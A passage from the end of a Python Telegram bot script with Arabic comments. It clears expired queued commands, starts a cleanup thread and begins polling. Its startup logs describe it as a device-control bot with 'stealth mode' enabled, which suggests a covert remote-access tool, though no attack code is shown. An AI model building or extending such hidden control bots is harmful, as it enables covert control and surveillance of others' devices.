            # تنظيف أوامر الانتظار المنتهية
            expired_commands = [
                user_id for user_id, command_data in command_queue.items()
                if current_time - command_data['timestamp'] > 300  # 5 دقائق
            ]

            for user_id in expired_commands:
                del command_queue[user_id]

            time.sleep(60)  # تنظيف كل دقيقة

        except Exception as e:
            logger.error(f"خطأ في تنظيف الجلسات: {e}")
            time.sleep(60)

# بدء خيط التنظيف
cleanup_thread = threading.Thread(target=cleanup_old_sessions, daemon=True)
cleanup_thread.start()

# إعداد المستخدمين المصرح لهم
setup_authorized_users()

# تشغيل البوت
if __name__ == "__main__":
    logger.info("🚀 بدء تشغيل بوت التحكم في الأجهزة...")
    logger.info("✅ تم تهيئة النظام بنجاح")
    logger.info("🔒 وضع الأمان مفعل")
    logger.info("👻 وضع التخفي مفعل")
    logger.info("💾 التخزين المحلي مفعل")

    try:
        bot.polling(none_stop=True, interval=0)
    except Exception as e:
        logger.error(f"خطأ في تشغيل البوت: {e}")